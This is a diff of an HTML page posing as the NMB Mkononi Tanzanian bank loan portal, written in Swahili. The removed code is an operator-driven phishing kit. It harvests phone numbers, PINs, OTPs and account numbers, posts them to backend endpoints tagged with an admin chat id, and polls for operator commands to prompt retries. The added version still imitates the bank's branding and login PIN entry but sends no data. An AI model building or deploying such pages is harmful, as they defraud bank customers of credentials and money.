@@ -3,303 +3,570 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Mkononi - Huduma za Kifedha</title>
+    <title>NMB Mkononi Tanzania - Huduma za Kifedha</title>
     <style>
+        :root {
+            --primary-color: #004d9b;
+            --primary-dark: #003366;
+            --bg-color: #f4f6f9;
+            --card-bg: #ffffff;
+            --text-main: #2d3748;
+            --text-muted: #718096;
+            --border-color: #e2e8f0;
+        }
+
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+
         body {
-            background-color: #f4f4f4;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background-color: var(--bg-color);
+            color: var(--text-main);
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
-        .container {
-            background: #fff;
-            width: 100%;
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            cursor: pointer;
+        }
+
+        .logo-icon {
+            background: #ffffff;
+            color: var(--primary-color);
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            font-weight: bold;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.1rem;
+            cursor: pointer;
+        }
+
+        .main-container {
             max-width: 480px;
-            padding: 20px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            border-radius: 8px;
+            width: 100%;
+            margin: 20px auto;
+            padding: 0 15px;
+            flex: 1;
         }
-        h2 {
-            color: #003366;
-            text-align: center;
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 25px 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             margin-bottom: 20px;
         }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        h1.hero-title {
+            text-align: center;
+            margin-bottom: 5px;
+            font-size: 1.4rem;
+        }
+
+        p.hero-subtitle {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+        }
+
+        .progress-bar-container {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+        }
+
+        .progress-segment {
+            flex: 1;
+            height: 4px;
+            background: var(--border-color);
+            border-radius: 2px;
+        }
+
+        .progress-segment.active {
+            background: var(--primary-color);
+        }
+
         .form-group {
             margin-bottom: 15px;
         }
+
         label {
             display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #555;
+            font-size: 0.85rem;
+            color: var(--text-main);
+            margin-bottom: 6px;
+            font-weight: 500;
         }
-        input, select {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        button {
+
+        input, select, textarea {
             width: 100%;
             padding: 12px;
-            background-color: #003366;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 0.95rem;
+            outline: none;
+            background: #fff;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            border-color: var(--primary-color);
+        }
+
+        .phone-input-group {
+            display: flex;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+            background: #fff;
+        }
+
+        .country-code {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 0 10px;
+            background: #f7fafc;
+            border-right: 1px solid var(--border-color);
+            font-size: 0.9rem;
+        }
+
+        .phone-input-group input {
+            border: none;
+        }
+
+        .btn-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn-primary {
+            flex: 1;
+            background-color: var(--primary-color);
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-align: center;
             cursor: pointer;
-            font-weight: bold;
+            text-decoration: none;
         }
-        button:hover {
-            background-color: #002244;
+
+        .btn-secondary {
+            flex: 1;
+            background-color: #e2e8f0;
+            color: var(--text-main);
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
         }
-        .hidden {
-            display: none;
+
+        .calculator-box {
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
         }
-        .error-msg {
-            color: red;
-            font-size: 14px;
-            margin-top: 5px;
+
+        .input-label-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .input-label-row span:last-child {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        input[type="range"] {
+            width: 100%;
+            accent-color: var(--primary-color);
+            cursor: pointer;
+        }
+
+        .monthly-payment-display {
+            background: #fafbfc;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 15px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 25px;
             text-align: center;
         }
-        .loading {
-            text-align: center;
-            font-weight: bold;
-            color: #003366;
+
+        .feature-item .f-icon {
+            font-size: 1.2rem;
+            margin-bottom: 5px;
+            color: var(--primary-color);
+        }
+
+        .feature-title {
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .feature-desc {
+            font-size: 0.65rem;
+            color: var(--text-muted);
+        }
+
+        .summary-box {
+            background: #fafbfc;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 15px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+        }
+
+        .summary-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
             margin: 15px 0;
+        }
+
+        .pin-box {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 1.2rem;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 0.75rem;
+            color: var(--text-muted);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>NMB Mkononi</h2>
-        
-        <!-- Step 1: Application Form -->
-        <div id="step-1">
-            <form id="applicationForm">
+
+    <header>
+        <div class="logo-container" onclick="showPage('page-slider')">
+            <div class="logo-icon">NMB</div>
+            NMB Mkononi
+        </div>
+        <button class="menu-btn" onclick="showPage('page-login')">Ingia</button>
+    </header>
+
+    <div class="main-container">
+
+        <!-- UKURASA WA 1: SLIDER / KIKOKOTOO -->
+        <div id="page-slider" class="card page active">
+            <h1 class="hero-title">Pata Mkopo Wako Haraka</h1>
+            <p class="hero-subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+
+            <div class="calculator-box">
+                <div style="font-weight:600; font-size:0.9rem; margin-bottom:10px;">Kikokotoo cha Mkopo</div>
                 <div class="form-group">
-                    <label for="contact">Namba ya Simu (10 Tarakimu, kuanzia na 0)</label>
-                    <input type="tel" id="contact" placeholder="Mf. 0712345678" maxlength="10" required>
+                    <div class="input-label-row">
+                        <span>Kiasi cha Mkopo</span>
+                        <span id="amount-val">TSh 100,000</span>
+                    </div>
+                    <input type="range" id="loan-amount" min="10000" max="100000000" step="10000" value="100000" oninput="updateCalc()">
                 </div>
-                <div class="form-group">
-                    <label for="pin">Namba ya Siri (PIN)</label>
-                    <input type="password" id="pin" placeholder="Weka PIN yako" maxlength="6" required>
+
+                <div class="form-group" style="margin-bottom:0;">
+                    <div class="input-label-row">
+                        <span>Muda wa Mkopo</span>
+                        <span id="term-val">miezi 12</span>
+                    </div>
+                    <input type="range" id="loan-term" min="6" max="60" step="1" value="12" oninput="updateCalc()">
                 </div>
-                <div class="form-group">
-                    <label for="amount">Kiasi cha Mkopo / Muamala</label>
-                    <select id="amount">
-                        <option value="TZS 1,000,000">TZS 1,000,000</option>
-                        <option value="TZS 2,500,000" selected>TZS 2,500,000</option>
-                        <option value="TZS 5,000,000">TZS 5,000,000</option>
-                    </select>
+
+                <div class="monthly-payment-display">
+                    <span style="font-size:0.85rem; color:var(--text-muted);">Malipo ya Kila Mwezi</span>
+                    <span id="monthly-val" style="font-size:1.1rem; font-weight:700; color:var(--primary-color);">TSh 9,504</span>
                 </div>
-                <button type="submit">Endelea</button>
-                <div id="error-1" class="error-msg"></div>
-            </form>
+            </div>
+
+            <button class="btn-primary" onclick="showPage('page-step1')">OMBA SASA</button>
+
+            <div class="features-grid">
+                <div class="feature-item">
+                    <div class="f-icon">⚡</div>
+                    <div class="feature-title">Idhini ya Haraka</div>
+                    <div class="feature-desc">Ndani ya masaa 24</div>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon">💰</div>
+                    <div class="feature-title">Riba Nafuu</div>
+                    <div class="feature-desc">Kuanzia 25%</div>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon">🔒</div>
+                    <div class="feature-title">Salama</div>
+                    <div class="feature-desc">Kiwango cha benki</div>
+                </div>
+            </div>
         </div>
 
-        <!-- Waiting Step -->
-        <div id="step-waiting" class="hidden">
-            <div class="loading">Inasubiri uthibitisho kutoka kwa mfumo... Tafadhali subiri.</div>
+        <!-- UKURASA WA 2: HATUA YA 1 YA MAOMBI -->
+        <div id="page-step1" class="card page">
+            <h1 class="hero-title" style="font-size:1.2rem;">Maombi ya Mkopo</h1>
+            <div class="step-indicator">Hatua 1 ya 3</div>
+            <div class="progress-bar-container">
+                <div class="progress-segment active"></div>
+                <div class="progress-segment"></div>
+                <div class="progress-segment"></div>
+            </div>
+
+            <div class="form-group">
+                <label>Aina ya Mkopo</label>
+                <select id="loan-type">
+                    <option>Mkopo wa Biashara</option>
+                    <option>Mkopo wa Haraka</option>
+                    <option>Mkopo wa Kilimo</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Kiasi cha Mkopo (TSh)</label>
+                <input type="number" id="input-amount" value="100000">
+            </div>
+
+            <div class="form-group">
+                <label>Muda wa Mkopo</label>
+                <select id="input-term">
+                    <option>Miezi 12</option>
+                    <option>Miezi 24</option>
+                    <option>Miezi 48</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Madhumuni ya Mkopo</label>
+                <textarea rows="3" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+            </div>
+
+            <button class="btn-primary" onclick="showPage('page-step2')">HATUA INAYOFUATA</button>
         </div>
 
-        <!-- Step 2: OTP Form -->
-        <div id="step-2" class="hidden">
-            <h3>Weka Namba ya Uthibitisho (OTP)</h3>
-            <p style="text-align: center; margin-bottom: 15px; font-size: 14px; color: #666;">Ingiza namba ya tarakimu 4 iliyotumwa kwenye simu yako.</p>
-            <form id="otpForm">
-                <div class="form-group">
-                    <label for="otp">Namba ya OTP</label>
-                    <input type="text" id="otp" placeholder="Tarakimu 4" maxlength="4" required>
+        <!-- UKURASA WA 3: HATUA YA 2 YA MAOMBI -->
+        <div id="page-step2" class="card page">
+            <h1 class="hero-title" style="font-size:1.2rem;">Maombi ya Mkopo</h1>
+            <div class="step-indicator">Hatua 2 ya 3</div>
+            <div class="progress-bar-container">
+                <div class="progress-segment active"></div>
+                <div class="progress-segment active"></div>
+                <div class="progress-segment"></div>
+            </div>
+
+            <div style="display: flex; gap: 10px;">
+                <div class="form-group" style="flex:1;">
+                    <label>Jina la Kwanza</label>
+                    <input type="text" id="first-name" placeholder="Jina la kwanza">
                 </div>
-                <button type="submit">Thibitisha OTP</button>
-                <div id="error-2" class="error-msg"></div>
-            </form>
-        </div>
-
-        <!-- Step 3: Account Number Form -->
-        <div id="step-3" class="hidden">
-            <h3>Weka Namba ya Akaunti</h3>
-            <p style="text-align: center; margin-bottom: 15px; font-size: 14px; color: #666;">Ingiza namba yako ya akaunti ya NMB yenye tarakimu 11.</p>
-            <form id="accountForm">
-                <div class="form-group">
-                    <label for="accountNumber">Namba ya Akaunti (Tarakimu 11)</label>
-                    <input type="text" id="accountNumber" placeholder="Mf. 21510000000" maxlength="11" required>
+                <div class="form-group" style="flex:1;">
+                    <label>Jina la Ukoo</label>
+                    <input type="text" id="last-name" placeholder="Jina la ukoo">
                 </div>
-                <button type="submit">Wasilisha Akaunti</button>
-                <div id="error-3" class="error-msg"></div>
-            </form>
+            </div>
+
+            <div class="form-group">
+                <label>Nambari ya Simu</label>
+                <div class="phone-input-group">
+                    <div class="country-code">🇹🇿 +255</div>
+                    <input type="text" placeholder="712345678">
+                </div>
+            </div>
+
+            <div class="btn-container">
+                <button class="btn-secondary" onclick="showPage('page-step1')">ILIYOTANGULIA</button>
+                <button class="btn-primary" onclick="prepareStep3(); showPage('page-step3');">HATUA INAYOFUATA</button>
+            </div>
         </div>
 
-        <!-- Success Screen -->
-        <div id="step-success" class="hidden">
-            <h3 style="color: green; text-align: center;">Imefaulu!</h3>
-            <p style="text-align: center; margin-top: 15px;">Ombi lako limepokelewa na linashughulikiwa kikamilifu.</p>
+        <!-- UKURASA WA 4: HATUA YA 3 YA MAOMBI -->
+        <div id="page-step3" class="card page">
+            <h1 class="hero-title" style="font-size:1.2rem;">Maombi ya Mkopo</h1>
+            <div class="step-indicator">Hatua 3 ya 3</div>
+            <div class="progress-bar-container">
+                <div class="progress-segment active"></div>
+                <div class="progress-segment active"></div>
+                <div class="progress-segment active"></div>
+            </div>
+
+            <div class="form-group">
+                <label>Hali ya Ajira</label>
+                <select>
+                    <option>Mfanyabiashara</option>
+                    <option>Ameajiriwa</option>
+                    <option>Miajiri Binafsi</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Mapato ya Mwaka (TSh)</label>
+                <input type="number" placeholder="Weka mapato ya mwaka">
+            </div>
+
+            <div class="summary-box">
+                <div style="font-weight: 600; font-size: 0.9rem; margin-bottom: 8px;">Muhtasari wa Maombi</div>
+                <div class="summary-row"><span>Kiasi cha Mkopo:</span> <span id="sum-amount">TSh 100,000</span></div>
+                <div class="summary-row"><span>Muda wa Mkopo:</span> <span id="sum-term">Miezi 12</span></div>
+                <div class="summary-row"><span>Madhumuni:</span> <span>Biashara</span></div>
+                <div class="summary-row"><span>Mwombaji:</span> <span id="sum-name">Mteja</span></div>
+            </div>
+
+            <div class="btn-container">
+                <button class="btn-secondary" onclick="showPage('page-step2')">ILIYOTANGULIA</button>
+                <button class="btn-primary" onclick="alert('Maombi yako yamewasilishwa kikamilifu kupitia NMB Mkononi!')">WASILISHA MAOMBI</button>
+            </div>
         </div>
+
+        <!-- UKURASA WA 5: INGIA AKAUNTI -->
+        <div id="page-login" class="card page">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div class="logo-icon" style="margin: 0 auto 10px auto; width: 45px; height: 45px; font-size: 1rem;">NMB</div>
+                <h2 style="font-size: 1.2rem;">Ingia NMB Mkononi</h2>
+                <p style="font-size: 0.75rem; color: var(--text-muted);">Huduma za Benki Kiganjani Mwako</p>
+            </div>
+
+            <div class="form-group">
+                <label>Nambari ya Simu</label>
+                <div class="phone-input-group">
+                    <div class="country-code">🇹🇿 +255</div>
+                    <input type="text" placeholder="712345678">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Weka PIN yako (tarakimu 4)</label>
+                <div class="pin-container">
+                    <input type="password" maxlength="1" class="pin-box">
+                    <input type="password" maxlength="1" class="pin-box">
+                    <input type="password" maxlength="1" class="pin-box">
+                    <input type="password" maxlength="1" class="pin-box">
+                </div>
+            </div>
+
+            <div style="text-align: right; margin-bottom: 15px;">
+                <a href="#" style="font-size: 0.8rem; color: var(--primary-color); text-decoration: none;">Umesahau PIN?</a>
+            </div>
+
+            <button class="btn-primary" onclick="alert('Umeingia kwenye akaunti yako ya NMB Mkononi mafanikio!')">INGIA</button>
+        </div>
+
     </div>
 
+    <footer>
+        &copy; 2026 NMB Mkononi Tanzania
+    </footer>
+
     <script>
-        let currentUserId = null;
-        let statusInterval = null;
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const adminChatId = urlParams.get('admin');
-
-        // Validation helper for strict 10 digits starting with 0
-        function validatePhoneNumber(number) {
-            return /^0\d{9}$/.test(number);
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
         }
 
-        document.getElementById('applicationForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const contact = document.getElementById('contact').value.trim();
-            const pin = document.getElementById('pin').value.trim();
-            const amount = document.getElementById('amount').value;
-            const errorDiv = document.getElementById('error-1');
+        function updateCalc() {
+            const amount = document.getElementById('loan-amount').value;
+            const term = document.getElementById('loan-term').value;
 
-            if (!validatePhoneNumber(contact)) {
-                errorDiv.textContent = 'Namba ya simu lazima iwe na tarakimu 10 kamili na ianze na 0.';
-                return;
-            }
-            errorDiv.textContent = '';
+            document.getElementById('amount-val').innerText = 'TSh ' + Number(amount).toLocaleString();
+            document.getElementById('term-val').innerText = 'miezi ' + term;
 
-            try {
-                let url = '/api/submit-application';
-                if (adminChatId) {
-                    url += `?admin=${encodeURIComponent(adminChatId)}`;
-                }
+            const principal = Number(amount);
+            const monthlyRate = 0.25 / 12;
+            const months = Number(term);
+            
+            let monthlyPayment = (principal * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
+            if(isNaN(monthlyPayment) || !isFinite(monthlyPayment)) monthlyPayment = principal / months;
 
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ contact, pin, amount })
-                });
-                const data = await res.json();
+            document.getElementById('monthly-val').innerText = 'TSh ' + Math.round(monthlyPayment).toLocaleString();
+        }
 
-                if (data.success) {
-                    currentUserId = data.userId;
-                    document.getElementById('step-1').classList.add('hidden');
-                    document.getElementById('step-waiting').classList.remove('hidden');
-                    startStatusPolling();
-                } else {
-                    errorDiv.textContent = data.error || 'Kosa limetokea. Jaribu tena.';
-                }
-            } catch (err) {
-                errorDiv.textContent = 'Hitilafu ya mtandao. Tafadhali jaribu tena.';
-            }
-        });
+        function prepareStep3() {
+            const amt = document.getElementById('input-amount').value;
+            const termSel = document.getElementById('input-term').value;
+            const fName = document.getElementById('first-name').value;
+            const lName = document.getElementById('last-name').value;
 
-        document.getElementById('otpForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const otp = document.getElementById('otp').value.trim();
-            const errorDiv = document.getElementById('error-2');
-
-            if (otp.length !== 4) {
-                errorDiv.textContent = 'OTP lazima iwe na tarakimu 4.';
-                return;
-            }
-            errorDiv.textContent = '';
-
-            try {
-                const res = await fetch('/api/submit-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ userId: currentUserId, otp })
-                });
-                const data = await res.json();
-
-                if (data.success) {
-                    document.getElementById('step-2').classList.add('hidden');
-                    document.getElementById('step-waiting').classList.remove('hidden');
-                    startStatusPolling();
-                } else {
-                    errorDiv.textContent = data.error || 'Imeshindikana kutuma OTP.';
-                }
-            } catch (err) {
-                errorDiv.textContent = 'Hitilafu ya mtandao.';
-            }
-        });
-
-        document.getElementById('accountForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const accountNumber = document.getElementById('accountNumber').value.trim();
-            const errorDiv = document.getElementById('error-3');
-
-            if (accountNumber.length !== 11) {
-                errorDiv.textContent = 'Namba ya akaunti lazima iwe na tarakimu 11 halali.';
-                return;
-            }
-            errorDiv.textContent = '';
-
-            try {
-                const res = await fetch('/api/submit-account', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ userId: currentUserId, accountNumber })
-                });
-                const data = await res.json();
-
-                if (data.success) {
-                    document.getElementById('step-3').classList.add('hidden');
-                    document.getElementById('step-waiting').classList.remove('hidden');
-                    startStatusPolling();
-                } else {
-                    errorDiv.textContent = data.error || 'Imeshindikana kutuma namba ya akaunti.';
-                }
-            } catch (err) {
-                errorDiv.textContent = 'Hitilafu ya mtandao.';
-            }
-        });
-
-        function startStatusPolling() {
-            if (statusInterval) clearInterval(statusInterval);
-
-            statusInterval = setInterval(async () => {
-                if (!currentUserId) return;
-                try {
-                    const res = await fetch(`/api/check-status/${currentUserId}`);
-                    if (!res.ok) return;
-                    const data = await res.json();
-
-                    if (data.status === 'APPROVED_LOAD_OTP') {
-                        clearInterval(statusInterval);
-                        document.getElementById('step-waiting').classList.add('hidden');
-                        document.getElementById('step-2').classList.remove('hidden');
-                    } else if (data.status === 'WAITING_ACCOUNT') {
-                        clearInterval(statusInterval);
-                        document.getElementById('step-waiting').classList.add('hidden');
-                        document.getElementById('step-3').classList.remove('hidden');
-                    } else if (data.status === 'SUCCESS') {
-                        clearInterval(statusInterval);
-                        document.getElementById('step-waiting').classList.add('hidden');
-                        document.getElementById('step-success').classList.remove('hidden');
-                    } else if (data.status === 'DENIED') {
-                        clearInterval(statusInterval);
-                        alert('Ombi lako limekataliwa.');
-                        location.reload();
-                    } else if (data.status === 'RETRY_PIN' || data.status === 'RETRY_OTP') {
-                        clearInterval(statusInterval);
-                        alert('Taarifa ulizoingiza si sahihi. Tafadhali rudia tena.');
-                        location.reload();
-                    } else if (data.status === 'RETRY_ACCOUNT') {
-                        clearInterval(statusInterval);
-                        alert('Namba ya akaunti si sahihi. Tafadhali rudia tena.');
-                        document.getElementById('step-waiting').classList.add('hidden');
-                        document.getElementById('step-3').classList.remove('hidden');
-                    }
-                } catch (e) {}
-            }, 3000);
+            if(amt) document.getElementById('sum-amount').innerText = 'TSh ' + Number(amt).toLocaleString();
+            if(termSel) document.getElementById('sum-term').innerText = termSel;
+            if(fName || lName) document.getElementById('sum-name').innerText = fName + ' ' + lName;
         }
     </script>
 </body>
-  </html>
-  
+                </html>
+                    
